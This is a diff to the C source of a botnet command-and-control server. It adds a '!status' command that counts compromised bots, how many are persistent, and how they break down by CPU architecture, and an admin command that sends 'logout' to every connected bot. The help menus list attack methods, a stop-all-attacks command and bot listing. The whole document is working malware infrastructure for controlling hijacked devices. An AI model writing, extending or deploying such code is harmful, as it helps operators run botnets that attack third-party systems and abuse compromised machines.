@@ -1,13 +1,13 @@
-#include "headers/command_handler.h"
-#include "headers/botnet.h"
-#include "headers/checks.h"
-#include "headers/user_handler.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <arpa/inet.h>
 #include <pthread.h>
+#include "headers/command_handler.h"
+#include "headers/botnet.h"
+#include "headers/checks.h"
+#include "headers/user_handler.h"
+#include <arpa/inet.h>
 
 #define CYAN "\033[1;36m"
 
@@ -25,6 +25,8 @@ void handle_removeuser_command(const User *user, const char *command, char *resp
 void handle_kickuser_command(const User *user, const char *command, char *response);
 void handle_admin_command(const User *user, char *response);
 void handle_ping_command(char *response);
+void handle_status_command(const User *user, char *response);
+void handle_logout_all_bots_command(const User *user, int client_socket);
 
 /*
 H E L P   C O M M A N D
@@ -33,7 +35,8 @@ void handle_help_command(char *response) {
     snprintf(response, MAX_COMMAND_LENGTH,
              PINK "!misc - shows misc commands\r\n"
              "!attack - shows attack methods\r\n"
-            "!admin - show admin and root commands\r\n"
+             "!admin - show admin and root commands\r\n"
+             "!status - check persistence status of bots\r\n"
              "!help - shows this msg\r\n" RESET);
 }
 /*
@@ -44,6 +47,7 @@ void handle_misc_command(char *response) {
              PINK "!stopall - stops all atks\r\n"
              "!opthelp - see attack options\r\n"
              "!bots - list bots\r\n"
+             "!status - check persistence status\r\n"
              "!user - show user or other users\r\n"
              "!clear - clear screen\r\n"
              "!exit - leave CNC\r\n" RESET);
@@ -333,6 +337,8 @@ void process_command(const User *user, const char *command, int client_socket, c
         handle_bots_command(response_buf);
     } else if (strcmp(command, "!ping") == 0) {
         handle_ping_command(response_buf);
+    } else if (strcmp(command, "!status") == 0) {
+        handle_status_command(user, response_buf);
     } else if (strcmp(command, "!clear") == 0) {
         handle_clear_command(response_buf);
     } else if (strcmp(command, "!opthelp") == 0) {
@@ -357,6 +363,9 @@ void process_command(const User *user, const char *command, int client_socket, c
         handle_attack_command(user, command, response_buf);
     } else if (strcmp(command, "!stopall") == 0) {
         handle_stopall_command(user, response_buf);
+    } else if (strcmp(command, "!logout all bots") == 0) {
+        handle_logout_all_bots_command(user, client_socket);
+        return;
     } else {
         snprintf(response_buf, sizeof(response_buf), RED "\rCommand not found\n" RESET);
     }
@@ -978,4 +987,112 @@ void handle_ping_command(char *response) {
         if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
     }
     pthread_mutex_unlock(&bot_mutex);
+}
+
+void handle_status_command(const User *user, char *response) {
+    int total_bots = 0;
+    int persistent_bots = 0;
+    int sent_requests = 0;
+    pthread_mutex_lock(&bot_mutex);
+
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].is_valid && bots[i].socket > 0) {
+            total_bots++;
+            bots[i].status_reported = 0;
+            
+            if (send(bots[i].socket, "status", 6, MSG_NOSIGNAL) > 0) {
+                sent_requests++;
+            }
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    
+    usleep(500000);
+    
+    pthread_mutex_lock(&bot_mutex);
+    int arch_count[12][2] = {0};
+    static const char* arch_names[] = {"mips", "mipsel", "x86_64", "aarch64", "arm", "x86", "m68k", "i686", "sparc", "powerpc64", "sh4", "unknown"};
+    
+    for (int i = 0; i < bot_count; i++) {
+        if (!bots[i].is_valid) continue;
+        
+        int arch_index = 11; // default to unknown
+        for (int j = 0; j < 11; j++) {
+            if (strcmp(bots[i].arch, arch_names[j]) == 0) {
+                arch_index = j;
+                break;
+            }
+        }
+        
+        arch_count[arch_index][0]++;
+        if (bots[i].is_persistent) {
+            persistent_bots++;
+            arch_count[arch_index][1]++;
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    
+    int offset = snprintf(response, MAX_COMMAND_LENGTH, 
+                        YELLOW "Bot Status Report\r\n" RESET
+                        GREEN "Total bots: %d | Persistent bots: %d (%.1f%%)\r\n" RESET,
+                        total_bots, persistent_bots, 
+                        total_bots > 0 ? (persistent_bots * 100.0 / total_bots) : 0.0);
+
+    for (int i = 0; i < 12; i++) {
+        if (arch_count[i][0] > 0) {
+            offset += snprintf(response + offset, MAX_COMMAND_LENGTH - offset, 
+                            CYAN "%-10s: %3d total, %3d persistent (%5.1f%%)\r\n" RESET,
+                            arch_names[i], arch_count[i][0], arch_count[i][1],
+                            (arch_count[i][1] * 100.0) / arch_count[i][0]);
+        }
+    }
+}
+
+void handle_logout_all_bots_command(const User *user, int client_socket) {
+    static char response[MAX_COMMAND_LENGTH];
+    static char buffer[32];
+    ssize_t len;
+    int confirmed = 0;
+
+    if (!user->is_admin) {
+        snprintf(response, sizeof(response), RED "Only admins can use !logout all bots\r\n" RESET);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
+        return;
+    }
+
+    snprintf(response, sizeof(response), YELLOW "Are you sure you want to logout ALL bots? (yes/no): " RESET);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    buffer[strcspn(buffer, "\r\n")] = 0;
+    if (strcasecmp(buffer, "yes") != 0) {
+        snprintf(response, sizeof(response), RED "Aborted.\r\n" RESET);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
+        return;
+    }
+    snprintf(response, sizeof(response), YELLOW "This will disconnect ALL bots. Confirm again (type 'CONFIRM'): " RESET);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
+    len = recv(client_socket, buffer, sizeof(buffer)-1, 0);
+    if (len <= 0) return;
+    buffer[len] = 0;
+    buffer[strcspn(buffer, "\r\n")] = 0;
+    if (strcmp(buffer, "CONFIRM") != 0) {
+        snprintf(response, sizeof(response), RED "Aborted.\r\n" RESET);
+        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
+        return;
+    }
+    // Envoi de la commande 'logout' à tous les bots
+    int logout_count = 0;
+    pthread_mutex_lock(&bot_mutex);
+    for (int i = 0; i < bot_count; i++) {
+        if (bots[i].is_valid && bots[i].socket > 0) {
+            if (send(bots[i].socket, "logout", 6, MSG_NOSIGNAL) > 0) {
+                logout_count++;
+            }
+        }
+    }
+    pthread_mutex_unlock(&bot_mutex);
+    snprintf(response, sizeof(response), GREEN "Sent logout command to %d bots.\r\n" RESET, logout_count);
+    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
 }
